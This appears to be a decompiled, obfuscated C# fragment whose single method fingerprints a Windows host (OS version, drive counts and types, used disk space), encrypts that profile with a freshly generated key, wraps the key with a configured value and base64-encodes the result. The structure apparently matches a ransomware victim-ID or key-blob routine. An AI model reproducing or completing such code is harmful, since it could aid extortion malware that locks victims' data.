using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

internal class Class7
{
	public class Class8
	{
		[CompilerGenerated]
		private static string string_0;

		[CompilerGenerated]
		private static byte[] byte_0;

		[CompilerGenerated]
		private static byte[] byte_1;

		[CompilerGenerated]
		private static string string_1;

		[CompilerGenerated]
		private static string string_2;

		[CompilerGenerated]
		private static string string_3;

		[CompilerGenerated]
		private static string string_4;

		[CompilerGenerated]
		private static string string_5;

		[CompilerGenerated]
		private static string string_6;

		[CompilerGenerated]
		private static string string_7;

		[CompilerGenerated]
		private static int int_0;

		[CompilerGenerated]
		private static int int_1;

		[CompilerGenerated]
		private static int int_2;

		[CompilerGenerated]
		private static int int_3;

		public static string String_0
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public static byte[] Byte_0
		{
			[CompilerGenerated]
			get
			{
				return byte_0;
			}
			[CompilerGenerated]
			set
			{
				byte_0 = value;
			}
		}

		public static byte[] Byte_1
		{
			[CompilerGenerated]
			get
			{
				return byte_1;
			}
			[CompilerGenerated]
			set
			{
				byte_1 = value;
			}
		}

		public static string String_1
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public static string String_2
		{
			[CompilerGenerated]
			get
			{
				return string_2;
			}
			[CompilerGenerated]
			set
			{
				string_2 = value;
			}
		}

		public static string String_3
		{
			[CompilerGenerated]
			get
			{
				return string_3;
			}
			[CompilerGenerated]
			set
			{
				string_3 = value;
			}
		}

		public static string String_4
		{
			[CompilerGenerated]
			get
			{
				return string_4;
			}
			[CompilerGenerated]
			set
			{
				string_4 = value;
			}
		}

		public static string String_5
		{
			[CompilerGenerated]
			get
			{
				return string_5;
			}
			[CompilerGenerated]
			set
			{
				string_5 = value;
			}
		}

		public static string String_6
		{
			[CompilerGenerated]
			get
			{
				return string_6;
			}
			[CompilerGenerated]
			set
			{
				string_6 = value;
			}
		}

		public static string String_7
		{
			[CompilerGenerated]
			get
			{
				return string_7;
			}
			[CompilerGenerated]
			set
			{
				string_7 = value;
			}
		}

		public static int Int32_0
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public static int Int32_1
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public static int Int32_2
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		public static int Int32_3
		{
			[CompilerGenerated]
			get
			{
				return int_3;
			}
			[CompilerGenerated]
			set
			{
				int_3 = value;
			}
		}
	}

	public static bool smethod_0()
	{
		try
		{
			string text = "Unknown";
			int int_ = 16;
			Class8.String_1 = Class12.smethod_10(5);
			Class8.String_1 = Class8.String_1.ToUpper();
			string text2 = Class12.smethod_8();
			if (text2 != null && !(text2 == ""))
			{
				if (text2.Split(new char[1] { ',' })[0] == "")
				{
					Class8.String_3 = text;
				}
				else
				{
					Class8.String_3 = text2.Split(new char[1] { ',' })[0];
				}
				if (text2.Split(new char[1] { ',' })[1] == "")
				{
					Class8.String_4 = text;
				}
				else
				{
					Class8.String_4 = text2.Split(new char[1] { ',' })[1];
				}
				if (text2.Split(new char[1] { ',' })[2] == "")
				{
					Class8.String_7 = text;
				}
				else
				{
					Class8.String_7 = text2.Split(new char[1] { ',' })[2];
				}
				if (!(text2.Split(new char[1] { ',' })[3] == ""))
				{
					Class8.String_6 = text2.Split(new char[1] { ',' })[3];
				}
				else
				{
					Class8.String_6 = text;
				}
			}
			else
			{
				Class8.String_3 = text;
				Class8.String_4 = text;
				Class8.String_7 = text;
				Class8.String_6 = text;
			}
			string text3 = Class12.smethod_9();
			if (string.IsNullOrEmpty(text3))
			{
				Class8.String_5 = text;
			}
			else
			{
				Class8.String_5 = text3;
			}
			Class8.String_2 = Environment.OSVersion.ToString();
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				Class8.Int32_0++;
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class8.Int32_1++;
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class8.Int32_2++;
					}
					Class8.Int32_3 += Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L);
				}
			}
			Class8.Byte_0 = Class12.smethod_11(GClass6.GClass7.Int32_1);
			Class8.Byte_1 = Class12.smethod_11(int_);
			string s = Class12.smethod_1(Class8.Byte_0) + char.ToString(',') + Class12.smethod_1(Class8.Byte_1) + char.ToString(',') + Class8.String_2 + char.ToString(',') + Class8.String_5 + char.ToString(',') + Class8.String_3 + char.ToString(',') + Class8.String_4 + char.ToString(',') + Class8.String_6 + char.ToString(',') + Class8.String_7 + char.ToString(',') + Convert.ToString(Class8.Int32_0) + char.ToString(',') + Convert.ToString(Class8.Int32_1) + char.ToString(',') + Convert.ToString(Class8.Int32_2) + char.ToString(',') + Convert.ToString(Class8.Int32_3) + char.ToString(',') + Convert.ToString(GClass6.GClass7.Double_1) + char.ToString(',') + Convert.ToString(GClass6.GClass7.Double_0);
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] array = Class12.smethod_11(GClass6.GClass7.Int32_0);
			bytes = Class9.smethod_1(bytes, array);
			array = Class9.smethod_2(array, GClass6.GClass7.String_5);
			byte[] byte_ = Class12.smethod_5(bytes, array);
			if (array != null)
			{
				Class8.String_0 = Class12.smethod_14(Class12.smethod_0(byte_), 64);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}
}
